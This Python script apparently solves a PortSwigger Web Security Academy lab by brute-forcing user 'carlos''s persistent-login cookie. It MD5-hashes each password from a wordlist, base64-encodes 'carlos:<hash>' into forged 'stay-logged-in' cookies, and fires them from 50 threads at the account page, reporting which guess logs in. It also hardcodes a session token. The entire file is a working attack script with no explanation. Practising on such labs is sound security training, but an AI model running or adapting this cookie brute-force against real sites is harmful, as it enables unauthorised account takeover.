from concurrent.futures import ThreadPoolExecutor
import requests
import base64
import hashlib

URL = "https://ac421f531ec6bf60c0aa516100b50027.web-security-academy.net/my-account?id=carlos"

pass_file = open('pass_portswigger.txt', 'r')
pass_list = pass_file.readlines()
pass_file.close()
my_cookies = []
pass_dict = {}

for password in pass_list:
    password_md5 = hashlib.md5(bytes(password.strip(),'utf-8')).hexdigest()
    login_cookie = base64.b64encode(bytes('carlos:' + password_md5, 'utf-8')).decode('utf-8')
    final_cookie = {'session': 'sSNCMoQjLSxkohptq8IESiGN2B5TgYvV', 'stay-logged-in': login_cookie}
    my_cookies.append(final_cookie)
    pass_dict[str(final_cookie)] = password


def fetch(session, url, test_cookie):
    with session.get(url, cookies=test_cookie) as req:
        if 'Your username is: carlos' in req.text:
            print(f"success: {pass_dict.get(str(test_cookie)).strip()}")
        else:
            print(f"fail: {pass_dict.get(str(test_cookie)).strip()}")


with ThreadPoolExecutor(max_workers=50) as executor:
    with requests.Session() as session:
        executor.map(fetch, [session]*len(my_cookies), [URL]*len(my_cookies), my_cookies)
        executor.shutdown(wait=True)